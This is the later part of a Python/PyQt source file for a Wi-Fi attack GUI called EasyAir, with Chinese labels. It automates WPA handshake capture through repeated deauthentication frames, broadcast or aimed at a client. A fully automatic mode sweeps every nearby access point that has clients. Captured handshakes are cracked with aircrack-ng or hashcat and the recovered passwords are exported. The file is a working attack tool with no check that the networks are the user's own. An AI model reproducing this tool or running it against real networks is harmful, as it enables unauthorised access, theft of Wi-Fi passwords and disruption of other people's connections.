            return
        bssid = self.lbl_target_bssid.text()
        if not self.mon_iface or not bssid:
            return
        client = self._selected_client()
        self._deauth_attempts += 1
        self.log(f"[deauth] 尚未捕获握手, 第 {self._deauth_attempts} 次重发 → {bssid}"
                 + (f" (定向 {client})" if client else " (广播)"))
        self._run_worker(
            lambda: self.core.deauth(self.mon_iface, bssid, 10, client), None)

    def _check_handshake(self):
        """轮询本次抓包文件, 用 has_handshake 真校验 EAPOL, 而非看文件存在。"""
        if getattr(self, "_checking_handshake", False) or \
                getattr(self, "_handshake_found", False):
            return
        # 全自动模式: 单个目标超时未抓到就跳到下一个, 不无限等待
        if getattr(self, "_auto_mode", False) and self._auto_deadline \
                and time.time() > self._auto_deadline \
                and not getattr(self, "_handshake_found", False):
            self.log(f"[全自动] ({self._auto_done + 1}/{self._auto_total}) "
                     f"超时未捕获握手，跳到下一个")
            self._auto_done += 1
            self._auto_deadline = None
            self._stop_capture(quiet=True)
            QTimer.singleShot(800, self._auto_next)
            return
        pref = getattr(self, "_cap_prefix", "")
        if not pref:
            return
        same = [f for f in self.core._iter_caps(self.core._dated_dir())
                if f.name.startswith(pref)]
        if not same:
            return
        cap = max(same, key=lambda x: x.stat().st_mtime)
        try:
            size = cap.stat().st_size
        except OSError:
            return
        # 文件没长过且校验过就没必要重复解析
        if getattr(self, "_hs_last", None) == (str(cap), size):
            return
        self._hs_last = (str(cap), size)
        self._checking_handshake = True
        self._run_worker(lambda: self.core.has_handshake(cap),
                         lambda ok: self._on_handshake_checked(cap, ok))

    def _on_handshake_checked(self, cap, ok):
        self._checking_handshake = False
        if getattr(self, "_handshake_found", False):
            return
        # 用户已停抓包后, 迟到的校验结果不能再报成功
        if not getattr(self, "_capture_running", False):
            return
        if not ok:
            # 关键: 文件存在 != 抓到握手。没真握手就不报成功
            self.lbl_handshake.setText("等待握手…")
            self.lbl_handshake.setStyleSheet("color: #f57c00; font-weight: bold;")
            self.set_status("抓包中 · 尚未捕获到握手，正在自动重发 deauth…")
            return
        self._handshake_found = True
        self.lbl_handshake.setText(f"握手包 {cap.name}")
        self.lbl_handshake.setStyleSheet("color: #2e7d32; font-weight: bold;")
        self.log(f"[成功] 已校验到真实握手包 → {cap.name}")
        self.bottom_tabs.setCurrentWidget(self.log_scan_box)
        self._refresh_cap_tree()
        self.set_status("握手包已捕获 · 抓包已自动停止")
        # 抓到即自动停止抓包
        self._stop_capture_timers()
        self._capture_running = False
        self._set_capture_btn(False)
        self._kill_capture()
        if getattr(self, "_auto_mode", False):
            self._auto_on_target_done(cap)
        else:
            self._prompt_add_after_capture(cap)

    def _prompt_add_after_capture(self, cap):
        """手动抓包成功后提示是否加入右侧破解列表。"""
        cap = Path(cap)
        ans = QMessageBox.question(
            self, "握手包已捕获",
            f"已捕获并校验到 {cap.name} 的真实握手包。\n"
            f"是否加入右侧破解列表进行跑包？",
            QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)
        if ans == QMessageBox.Yes:
            if self._add_cap_to_crack(cap):
                self.log(f"[抓包] 已加入右侧破解列表: {cap.name}")
                self.set_status("已加入右侧破解列表 · 可点「开始破解」")
        else:
            self.set_status("握手包已保存到握手包库 · 可稍后手动加入")

    def _add_cap_to_crack(self, cap, essid=None, bssid=None) -> bool:
        """把一个握手包加入右侧破解列表(已存在则跳过)。"""
        tree = self._current_result_tree()
        if tree is None:
            return False
        cap = Path(cap)
        existing = {tree.topLevelItem(i).text(tree.COL_CAP)
                    for i in range(tree.topLevelItemCount())}
        if str(cap) in existing:
            return False
        meta = self.core.cap_meta(cap)
        essid = essid or meta.get("essid") or cap.stem
        bssid = bssid or meta.get("bssid") or "-"
        note = self.core.cap_note(cap)
        item = tree.add_target(bssid, essid, str(cap), note)
        self.current_crack_date = self._tab_date()
        self.core.history_add(self.current_crack_date, tree.to_record(item))
        idx = self.result_tabs.currentIndex()
        if idx >= 0:
            self.result_tabs.setTabText(
                idx, f"{self.current_crack_date} ({tree.topLevelItemCount()})")
        return True

    def _refresh_capture_clients(self):
        """抓包期间周期刷新目标 AP 的在线客户端数量与下拉列表。"""
        if not getattr(self, "_capture_running", False):
            return
        pref = getattr(self, "_cap_prefix", "")
        # 用启动时锁定的 BSSID, 不用界面标签(中途点选会改掉标签)
        bssid = ((getattr(self, "_cap_bssid", "") or "").upper()
                 or self.lbl_target_bssid.text().upper())
        if not pref or not bssid:
            return
        try:
            csvs = [c for c in self.core._dated_dir().glob(pref + "*.csv")
                    if c.is_file()]
        except OSError:
            return
        if not csvs:
            return
        csvf = max(csvs, key=lambda x: x.stat().st_mtime)
        try:
            txt = csvf.read_text(errors="ignore", encoding="utf-8")
        except OSError:
            return
        if "Station MAC" not in txt:
            return
        station_sec = txt.split("Station MAC", 1)[1]
        stations = self._parse_station_section(station_sec)
        macs = sorted(set([c["mac"] for c in stations.get(bssid, [])])
                      | set((getattr(self, "_sniffed_clients", None)
                             or {}).get(bssid, ())))
        self._ap_clients[bssid] = macs
        combo = getattr(self, "client_combo", None)
        if combo is None:
            return
        shown = [combo.itemData(i) for i in range(1, combo.count())]
        if set(shown) == set(macs):
            return
        keep = self._selected_client()
        combo.blockSignals(True)
        combo.clear()
        combo.addItem("全部 (广播)", "")
        for m in macs:
            combo.addItem(m, m)
        auto = None
        if keep:
            i = combo.findData(keep)
            combo.setCurrentIndex(i if i >= 0 else 0)
        elif macs and not getattr(self, "_client_auto_directed", False):
            # 发现目标自带在线客户端就自动定向一次: 广播 deauth 常被
            # AP/客户端忽略, 定向迫使其重连才是 EAPOL 的主要来源。
            # 用户手动切回广播后不再打扰(只自动定向一次)。
            self._client_auto_directed = True
            combo.setCurrentIndex(1)
            auto = macs[0]
        combo.blockSignals(False)
        if auto:
            self.log(f"[deauth] 已自动定向到 {auto}(下拉框可手动切回广播)")
        self.log(f"[客户端] {bssid} 在线客户端更新为 {len(macs)} 个")

    # ===== 独立客户端嗅探(tcpdump data 帧, 补 airodump 不列关联客户端) =====
    def _sniffer_acquire(self, tag: str):
        """扫描/抓包声明使用嗅探器; 第一个使用者负责启动。"""
        users = getattr(self, "_sniffer_users", None)
        if users is None:
            users = self._sniffer_users = set()
        users.add(tag)
        if getattr(self, "_sniffer_thread", None) is not None:
            return
        mon = self.mon_iface
        if not mon:
            return
        self._run_worker(lambda: self.core.start_client_sniffer(mon),
                         self._on_sniffer_started)

    def _on_sniffer_started(self, proc):
        if not proc:
            return
        if getattr(self, "_sniffer_thread", None) is not None:
            try:
                proc.terminate()
            except Exception:
                pass
            return
        t = self._spawn_cmd(proc, self._on_sniffer_line)
        t.finished.connect(lambda: self._forget_sniffer(t))
        self._sniffer_thread = t
        self.log("[客户端] 已启动数据帧嗅探 · 实时帧见下方'📶 数据帧'标签页")

    def _forget_sniffer(self, t):
        if getattr(self, "_sniffer_thread", None) is t:
            self._sniffer_thread = None

    def _sniffer_release(self, tag: str):
        """释放使用声明; 没人用时才真正停掉嗅探器。"""
        users = getattr(self, "_sniffer_users", set())
        users.discard(tag)
        if users:
            return
        t = getattr(self, "_sniffer_thread", None)
        self._sniffer_thread = None
        if t is not None:
            try:
                t.stop()
            except Exception:
                pass

    def _on_sniffer_line(self, line: str):
        # 实时数据帧窗口: 把抓到的帧显示到"数据帧"标签页(像 minidwep 的信息窗口)
        self._append_pkt(line)
        try:
            hit = self.core.parse_sniffer_line(line)
        except Exception:
            return
        if not hit:
            return
        mac, bssid = hit
        bag = self._sniffed_clients.setdefault(bssid, set())
        if mac in bag:
            return
        bag.add(mac)
        if not getattr(self, "_sniff_noticed", False):
            self._sniff_noticed = True
            self.log(f"[客户端] 嗅探到在线客户端 {mac} (AP {bssid})")

    _BCAST = ("FF:FF:FF:FF:FF:FF", "01:00:5E", "33:33", "01:80:C2")

    def _format_pkt_line(self, line: str):
        """把一行 tcpdump -e 输出压成简短可读的帧信息, 无效/噪音返回 None。"""
        if not line or "SA:" not in line:
            return None
        low = line.lower()
        if "probe request" in low:
            kind = "PROBE"
        elif "deauth" in low:
            kind = "DEAUTH"
        elif "disassoc" in low:
            kind = "DISSOC"
        elif "eapol" in low:
            kind = "EAPOL"
        elif "qos data" in low or " data" in low or " cf" in low:
            kind = "DATA"
        else:
            return None
        sa = re.search(r"\bSA:([0-9A-Fa-f:]{17})\b", line)
        bs = re.search(r"\bBSSID:([0-9A-Fa-f:]{17})\b", line)
        da = re.search(r"\bDA:([0-9A-Fa-f:]{17})\b", line)
        if not sa:
            return None
        src = sa.group(1).upper()
        ap = bs.group(1).upper() if bs else "?"
        dst = da.group(1).upper() if da else ""
        if "probe request" in low:
            body = f"{src} → (探测请求)"
        else:
            body = f"{src} → {ap}"
        bcast = dst.startswith(self._BCAST)
        tail = "  [广播]" if bcast else ""
        stamp = datetime.datetime.now().strftime("%H:%M:%S")
        return f"[{stamp}] {kind:<7} {body}{tail}"

    def _append_pkt(self, line: str):
        box = getattr(self, "pkt_box", None)
        if box is None:
            return
        try:
            txt = self._format_pkt_line(line)
        except Exception:
            return
        if txt:
            box.appendPlainText(txt)

    def _clear_pkt(self):
        box = getattr(self, "pkt_box", None)
        if box is not None:
            box.clear()

    def _auto_on_target_done(self, cap):
        """全自动模式: 记录本次成功, 然后抓下一个。"""
        self._auto_done += 1
        if self._add_cap_to_crack(cap):
            self._auto_ok += 1
            self.log(f"[全自动] ({self._auto_done}/{self._auto_total}) "
                     f"已加入 {Path(cap).name}")
        QTimer.singleShot(1200, self._auto_next)

    def _stop_capture_timers(self):
        for name in ("cap_check_timer", "deauth_retry_timer",
                     "client_refresh_timer"):
            t = getattr(self, name, None)
            if t is not None and t.isActive():
                try:
                    t.stop()
                except Exception:
                    pass

    def _kill_capture(self):
        """杀掉后台的抓包 airodump(带 --background 会脱离父进程)。"""
        pref = getattr(self, "_cap_prefix", "")
        self._run_worker(lambda: self.core.kill_capture_processes(pref), None)

    def _set_capture_btn(self, running: bool):
        if not hasattr(self, "btn_capture"):
            return
        self.btn_capture.setText("⏸ 停止抓包" if running else "📡 抓握手包")
        self.btn_capture.setStyleSheet("font-weight: bold;")

    def _stop_capture(self, quiet: bool = False):
        self._capture_running = False
        self._stop_capture_timers()
        # 抓包结束释放嗅探器(扫描还在用则不断, 引用计数)
        self._sniffer_release("capture")
        if getattr(self, 'cap_thread', None):
            try:
                self.cap_thread.stop()
            except Exception:
                pass
            self.cap_thread = None
        self._kill_capture()
        self._set_capture_btn(False)
        if not getattr(self, "_handshake_found", False):
            self.lbl_handshake.setText("未捕获")
            self.lbl_handshake.setStyleSheet("color: #c62828; font-weight: bold;")
        if not quiet:
            self.set_status("已停止抓包")
            self.log("[抓包] 已停止抓包")

    # ===== 全自动抓包(依次抓取所有有客户端的 AP) =====
    _AUTO_PER_TARGET_SECS = 90

    def _toggle_auto_capture(self):
        if getattr(self, "_auto_mode", False):
            self._stop_auto_capture()
        else:
            self._start_auto_capture()

    def _auto_targets(self) -> list:
        """从当前 AP 表里取所有有在线客户端的目标(按表格当前排序)。"""
        out = []
        for r in range(self.ap_table.rowCount()):
            def cell(c):
                it = self.ap_table.item(r, c)
                return it.text() if it else ""
            try:
                n = int(cell(2))
            except (TypeError, ValueError):
                n = 0
            if n <= 0:
                continue
            bssid = cell(4)
            if not bssid:
                continue
            out.append({"essid": cell(1), "bssid": bssid,
                        "ch": cell(5), "clients": self._ap_clients.get(
                            bssid.upper(), [])})
        return out

    def _start_auto_capture(self):
        if getattr(self, "_capture_running", False):
            self._stop_capture(quiet=True)
        targets = self._auto_targets()
        if not targets:
            QMessageBox.information(
                self, "提示",
                "当前没有发现「有在线客户端」的 AP。\n"
                "请先点「扫描」，待列表出现带客户端的 AP 后再用全自动抓包。")
            return
        self._auto_queue = targets
        self._auto_total = len(targets)
        self._auto_done = 0
        self._auto_ok = 0
        self._auto_mode = True
        self._set_auto_btn(True)
        self.log(f"[全自动] 共 {self._auto_total} 个有客户端的 AP，开始依次抓包")
        self._auto_next()

    def _auto_next(self):
        if not getattr(self, "_auto_mode", False):
            return
        if not self._auto_queue:
            self._finish_auto()
            return
        tgt = self._auto_queue.pop(0)
        self.lbl_target_essid.setText(tgt["essid"])
        self.lbl_target_bssid.setText(tgt["bssid"])
        self.lbl_target_ch.setText(tgt.get("ch") or "--")
        self.lbl_handshake.setText("未捕获")
        self.lbl_handshake.setStyleSheet("color: #c62828; font-weight: bold;")
        if hasattr(self, "client_combo"):
            self.client_combo.clear()
            self.client_combo.addItem("全部 (广播)", "")
            for mac in self._ap_clients.get(tgt["bssid"].upper(), []):
                self.client_combo.addItem(mac, mac)
        self.log(f"[全自动] ({self._auto_done + 1}/{self._auto_total}) "
                 f"抓取 {tgt['essid']} ({tgt['bssid']})")
        self._auto_deadline = time.time() + self._AUTO_PER_TARGET_SECS
        self._start_capture()

    def _stop_auto_capture(self, quiet: bool = False):
        self._auto_mode = False
        self._auto_queue = []
        self._auto_deadline = None
        self._set_auto_btn(False)
        if getattr(self, "_capture_running", False):
            self._stop_capture(quiet=quiet)
        if not quiet:
            self.log(f"[全自动] 已停止 (成功 {self._auto_ok}/{self._auto_total})")
            self.set_status("已停止全自动抓包")

    def _set_auto_btn(self, running: bool):
        if not hasattr(self, "btn_auto_cap"):
            return
        self.btn_auto_cap.setText("⏹ 停止全自动" if running else "⚡ 全自动抓包")
        self.btn_auto_cap.setStyleSheet("font-weight: bold;")

    def _finish_auto(self):
        self._auto_mode = False
        self._auto_queue = []
        self._auto_deadline = None
        self._set_auto_btn(False)
        self.log(f"[全自动] 完成: 成功捕获 {self._auto_ok}/{self._auto_total} 个握手包")
        self.set_status(
            f"全自动抓包完成 · 成功 {self._auto_ok}/{self._auto_total}"
            + (" · 可点「开始破解」" if self._auto_ok else ""))

    def _auto_stop_monitor(self):
        if self.auto_monitor_enabled and self.mon_iface:
            self.log("[自动] 关闭监听模式...")
            mon = self.mon_iface
            self._run_worker(lambda: self.core.stop_monitor(mon),
                             lambda p: setattr(self, 'mon_iface', None))

    # ===== 破解 =====
    def _temp_limit(self) -> int:
        try:
            return int(self.core.config.get("hashcat_temp_limit", 85) or 0)
        except (TypeError, ValueError):
            return 0

    def _hwmon_args(self) -> str:
        tl = self._temp_limit()
        return f"--hwmon-temp-abort={tl}" if tl else ""

    def _resolve_cap(self) -> Optional[Path]:
        """优先用握手包库选中项，否则用最新握手包"""
        sel = self.cap_tree.selectedItems()
        if sel:
            cap = sel[0].data(0, Qt.UserRole)
            if cap and Path(cap).exists():
                return Path(cap)
        return self.core.get_latest_handshake()

    def _start_crack(self):
        cap = self._resolve_cap()
        if not cap:
            QMessageBox.warning(self, "提示", "未检测到握手包，请先抓取握手包")
            return
        wordlists = self.core.get_wordlists()
        if not wordlists:
            QMessageBox.warning(self, "提示", "请先在'字典管理'中添加字典文件")
            return

        essid = self.lbl_target_essid.text()
        bssid = self.lbl_target_bssid.text()
        # 没在左侧选中 AP 时不要写成"未选择": 用握手包自带的元信息
        # (抓包时记下的 SSID/BSSID) 兜底, 否则右侧会多出一行无意义的"未选择"
        meta = self.core.cap_meta(Path(cap))
        if not essid or essid == "未选择":
            essid = meta.get("essid") or Path(cap).stem
        if not bssid or bssid == "未选择":
            bssid = meta.get("bssid") or "-"

        tree = self._current_result_tree()
        self.current_crack_date = self._tab_date()
        self.current_crack_item = tree.add_target(bssid, essid, str(cap))
        self.current_crack_tree = tree
        # 真正开始跑了才标记"进行中", 未跑前保持"待破解"
        self.current_crack_item.setText(CrackResultWidget.COL_STATE, "进行中")
        self.current_crack_item.setText(CrackResultWidget.COL_TIME, "00:00")
        idx = tree.indexOfTopLevelItem(self.current_crack_item)
        self.core.history_add(self.current_crack_date, tree.to_record(self.current_crack_item))
        self.result_tabs.setTabText(
            self.result_tabs.currentIndex(),
            f"{self.current_crack_date} ({tree.topLevelItemCount()})")
        tree.setCurrentItem(self.current_crack_item)
        self.log(f"[记录] 已写入 {self.current_crack_date} (第 {idx + 1} 条)")

        self.progress_bar.setValue(0)
        self.progress_bar.setVisible(True)
        self.lbl_progress.setText("正在启动破解...")
        self.btn_start_crack.setEnabled(True)
        self.btn_start_crack.setText("⏹ 停止破解")
        self.btn_start_crack.setStyleSheet(
            "font-weight: bold;")
        self._crack_running = True
        self.crack_start_time = time.time()
        self.crack_timer.start()
        self.bottom_tabs.setCurrentWidget(self.log_crack_box)

        engine = self.core.config.get("crack_engine", "Hashcat (GPU/CPU)")
        if engine.startswith("Aircrack"):
            self.log_crack(f"> aircrack-ng '{cap}' -w '{wordlists[0]}'")
            self._run_worker(
                lambda: self.core.crack_aircrack(str(cap), wordlists[0]),
                self._on_crack_proc)
            self.log_crack("[破解中] Aircrack-ng 正在跑字典...")
        else:
            self._run_hashcat(str(cap), wordlists)

    def _on_crack_proc(self, p):
        self.crack_thread = self._spawn_cmd(
            p, self._on_crack_output, self._on_crack_finished)

    def _run_hashcat(self, cap, wordlists):
        self.log_crack("[Hashcat] 正在转换 .cap -> .hc22000...")
        self._run_worker(
            lambda: self.core.cap_to_hc22000(cap),
            lambda p: self._on_conv_proc(p, cap, wordlists))

    def _on_conv_proc(self, pconv, cap, wordlists):
        self.conv_thread = self._spawn_cmd(
            pconv, self.log_crack, lambda: self._on_conv_done(cap, wordlists))

    def _on_conv_done(self, cap, wordlists):
        hc = Path(cap).with_suffix(".hc22000")
        if not hc.exists():
            self.log_crack("[错误] hcxpcapngtool 转换失败")
            self._on_crack_finished()
            return
        self.log_crack(f"[转换完成] {hc}")
        device = self.core.config.get("crack_device", "GPU + CPU (自动)")
        use_gpu = device != "仅 CPU"
        extra = self.core.config.get("hashcat_extra_args", "")
        self.log_crack(
            f"> hashcat -m 22000 {'-D 1,2' if use_gpu else '-D 1'} {self._hwmon_args()}"
            f" {extra} '{hc}' {' '.join(wordlists)}")
        tl = self._temp_limit()
        if tl:
            self.log_crack(f"[保护] GPU 温度上限 {tl}°C，达到即自动中止")
        self._run_worker(
            lambda: self.core.crack_hashcat(str(hc), wordlists, use_gpu, extra, tl),
            self._on_crack_proc)
        self._sync_record_buttons()
        self.log_crack("[破解中] Hashcat 正在跑字典...")

    def _on_crack_output(self, line):
        self.log_crack(line)
        if "KEY FOUND" in line or "FOUND" in line.upper():
            match = re.search(r'\[(.*?)\]', line) or re.search(r'KEY FOUND.*?(\S+)', line)
            if match:
                self._update_record(match.group(1))
                return
            self._update_record(line.strip())
            return

        m = re.search(r'(\d+\.\d+)%', line)
        if m:
            self.progress_bar.setValue(int(float(m.group(1))))
        if "speed" in line.lower() or "速度" in line:
            m = re.search(r'([\d]+(?:\.\d+)?\s*[kMG]?H/s)', line)
            if m:
                self.lbl_progress.setText(
                    f"破解中... 已耗时: {self._format_elapsed(self.crack_start_time)} | 速度 {m.group(1)}"
                )

    def _update_record(self, password):
        tree = getattr(self, 'current_crack_tree', None)
        if not tree or not self.current_crack_item:
            return
        tree.update_progress(self.current_crack_item, password,
                             self._format_elapsed(self.crack_start_time))
        self._persist_record()

    def _persist_record(self):
        """落盘破解进度。history.json 是整文件读写, 所以由 _update_crack_timer
        节流到最多每 5s 调一次; 交互操作(备注/开始/结束/退出)直接调用本函数。"""
        tree = getattr(self, 'current_crack_tree', None)
        if not tree or not self.current_crack_item:
            return
        # tree 可能已被重建(如批量添加/清空后切换 tab), 此时旧 item 失效,
        # 直接对 C++ 对象取 indexOfTopLevelItem 会抛 RuntimeError
        try:
            index = tree.indexOfTopLevelItem(self.current_crack_item)
        except RuntimeError:
            self.current_crack_item = None
            return
        if index < 0:
            return
        self._last_persist = time.time()
        self.core.history_update(self.current_crack_date, index,
                                 tree.to_record(self.current_crack_item))

    def _update_crack_timer(self):
        elapsed = self._format_elapsed(self.crack_start_time)
        self.lbl_progress.setText(f"破解中 · {elapsed}")
        tree = getattr(self, 'current_crack_tree', None)
        if tree and self.current_crack_item:
            tree.update_progress(self.current_crack_item, None, elapsed)
            if time.time() - self._last_persist >= 5.0:
                self._persist_record()

    def _countdown_num(self) -> int:
        """以扫描启动瞬间为锚, 返回严格递减的倒计时秒数。

        锚点只在开始扫描时算一次, 之后用 elapsed 整除得到秒数,
        这样每个数字恰好停留 1 秒, 不会出现跳秒或回跳。"""
        if not self._cd_anchor_left:
            return 0
        elapsed = time.time() - self.scan_start_time
        # _cd_anchor_left 是开始时的剩余秒数(整数)。
        # 向上取整: t=0 显示满值(6), t=1 显示 5 ... 每个数字正好停 1 秒。
        # 用 int() 会立刻少 1 格, 起步就错位。
        left = self._cd_anchor_left - elapsed
        n = -int(-left // 1)  # 等价 math.ceil, 避免多 import
        return n if n > 1 else 1

    def _tick_scan_clock(self):
        """仅刷新时长与倒计时(200ms), 不做任何解析或 IO。

        计时基于 time.time() 差值而非累加, 因此即使个别 tick 被拖慢
        或丢失, 下一帧会自动校正, 不会越走越偏或出现跳秒。
        """
        if not self.scan_start_time:
            return
        # 200ms 一次的 tick 里绝大多数时候文本没变(如倒计时 5->5->5)。
        # 无条件 setText 会白白触发重绘, 这是扫描时界面卡顿的主因之一。
        txt = self._scan_elapsed_text()
        if txt != self._last_clock_text:
            self._last_clock_text = txt
            self.scan_elapsed.setText(txt)
        if self.scan_deadline and time.time() >= self.scan_deadline:
            # 本槽每 200ms 进一次, 不置位会重复触发停止流程
            if getattr(self, "_autostop_firing", False):
                return
            self._autostop_firing = True
            self._stop_scan()

    def _format_elapsed(self, start):
        elapsed = max(0, int(time.time() - start))
        h, rem = divmod(elapsed, 3600)
        m, s = divmod(rem, 60)
        return f"{h:02d}:{m:02d}:{s:02d}"

    def _on_crack_finished(self):
        self.crack_timer.stop()
        self.progress_bar.setVisible(False)
        self._sync_record_buttons()
        self.btn_start_crack.setEnabled(True)
        self.btn_start_crack.setText("▶ 开始破解")
        self.btn_start_crack.setStyleSheet(
            "font-weight: bold;")
        self._crack_running = False

        tree = getattr(self, 'current_crack_tree', None)
        if tree and self.current_crack_item:
            pwd = self.current_crack_item.text(CrackResultWidget.COL_PWD)
            if not pwd or pwd == "破解中...":
                tree.set_failed(self.current_crack_item, "未找到密码")
            self._persist_record()

        self.lbl_progress.setText("破解完成")
        self.set_status("破解任务结束")
        self.log_crack("[完成] 破解任务结束")

    def _stop_crack(self):
        self._crack_running = False
        if self.crack_thread:
            self.crack_thread.stop()
            self.crack_thread = None
        if self.conv_thread:
            self.conv_thread.stop()
            self.conv_thread = None
        self.crack_timer.stop()
        self.progress_bar.setVisible(False)
        self._sync_record_buttons()
        self.btn_start_crack.setEnabled(True)
        self.btn_start_crack.setText("▶ 开始破解")
        self.btn_start_crack.setStyleSheet(
            "font-weight: bold;")
        self._crack_running = False
        tree = getattr(self, 'current_crack_tree', None)
        if tree and self.current_crack_item:
            tree.set_failed(self.current_crack_item, "已停止")
            self._persist_record()
        self.log_crack("[已停止] 破解已终止")
        self.set_status("破解已停止")

    def _export_results(self):
        fn, _ = QFileDialog.getSaveFileName(
            self, "导出结果",
            str(Path.home() / "easyair_results.txt"), "文本文件 (*.txt)")
        if not fn:
            return
        if not fn.lower().endswith(".txt"):
            fn += ".txt"
        sep = "－" * 40
        rows = []
        for date in self.core.history_dates():
            for rec in self.core.history_records(date):
                pwd = (rec.get("password") or "").strip()
                if pwd == "破解中...":
                    pwd = ""
                rows.append((date, rec, pwd))
        if not rows:
            QMessageBox.information(self, "提示", "没有可导出的记录")
            return
        try:
            with open(fn, 'w', encoding='utf-8') as f:
                for date, rec, pwd in rows:
                    f.write(sep + "\n")
                    f.write(f"WiFi名称: {rec.get('essid') or '(未知)'}\n")
                    f.write(f"BSSID:   {rec.get('bssid') or '-'}\n")
                    f.write(f"密码:     {pwd or '(未破解)'}\n")
                    f.write(f"状态:     {rec.get('status') or ''}\n")
                    f.write(f"日期:     {date}\n")
                    note = (rec.get("note") or "").strip()
                    if note:
                        f.write(f"备注:     {note}\n")
                f.write(sep + "\n")
            n_ok = sum(1 for _, _, p in rows if p and p not in ("未找到", "已停止"))
            QMessageBox.information(
                self, "成功", f"已导出 {len(rows)} 条记录到:\n{fn}")
            self.log(f"[导出] 已导出 {len(rows)} 条记录(含密码 {n_ok} 条)到: {fn}")
        except OSError as e:
            QMessageBox.warning(self, "错误", f"导出失败: {e}")


VERSION = "1.18.0"


def _selftest() -> int:
    """离线自检: 不需要真实网卡, 用于验证打包产物是否可运行。

    必须真正 exit, 否则 --selftest 会像普通启动一样进入事件循环,
    外面只能靠 timeout 杀掉, 退出码毫无意义(之前的"冒烟通过"是假象)。"""
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    app = QApplication.instance() or QApplication(sys.argv[:1])
    app.setStyle("Fusion")
    wins = []
    ok = True

    def chk(label, cond, extra=""):
        nonlocal ok
        print(f"  {'PASS' if cond else 'FAIL'}  {label}" + (f"  {extra}" if extra else ""))
        if not cond:
            ok = False

    print(f"EasyAir v{VERSION} 自检")
    chk("版本号可读", bool(VERSION), VERSION)
    try:
        w = EasyAirApp()
        wins.append(w)
        chk("主窗口创建", w is not None)
        chk("配置目录可写", w.core.caps_dir.parent.exists()
            or w.core.caps_dir.parent.mkdir(parents=True, exist_ok=True) is None)
        chk("默认扫描时长", w.scan_auto_stop == 45, f"{w.scan_auto_stop} 秒")

        # 倒计时: 模拟 6 秒, 必须严格 1 秒 1 跳
        w._stop_scan = lambda: None
        w.scan_timer.stop()
        w.scan_start_time = time.time()
        w.scan_deadline = w.scan_start_time + 45
        w._cd_anchor_left = 45
        w._last_clock_text = ""
        w._autostop_firing = False
        w.tick_timer.start()
        seen, t0 = [], time.time()
        while time.time() - t0 < 6:
            app.processEvents()
            w._tick_scan_clock()
            cur = w.scan_elapsed.text()
            if not seen or seen[-1][1] != cur:
                seen.append((round(time.time() - t0, 2), cur))
            time.sleep(0.02)
        w.tick_timer.stop()
        nums = []
        for _, t in seen:
            if "s 后" in t:
                nums.append(int(t.split("|")[1].split("s")[0]))
        uniq = []
        for n in nums:
            if not uniq or uniq[-1] != n:
                uniq.append(n)
        chk("倒计时逐秒递减", uniq[:5] == [45, 44, 43, 42, 41], str(uniq[:6]))
        gaps = [round(b[0] - a[0], 2) for a, b in zip(seen, seen[1:]) if "s 后" in b[1]]
        chk("每格约 1 秒", all(0.9 <= g <= 1.2 for g in gaps), str(gaps))
    except Exception as e:  # noqa: BLE001
        import traceback
        print(f"  FAIL  自检异常: {e}")
        traceback.print_exc()
        ok = False
    for w in wins:
        try:
            w.close()
        except Exception:  # noqa: BLE001
            pass
    print("自检结果:", "全部通过" if ok else "存在失败项")
    return 0 if ok else 1


if __name__ == "__main__":
    if "--version" in sys.argv:
        print(f"EasyAir {VERSION}")
        sys.exit(0)
    if "--selftest" in sys.argv:
        sys.exit(_selftest())
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    win = EasyAirApp()
    win.show()
    sys.exit(app.exec())
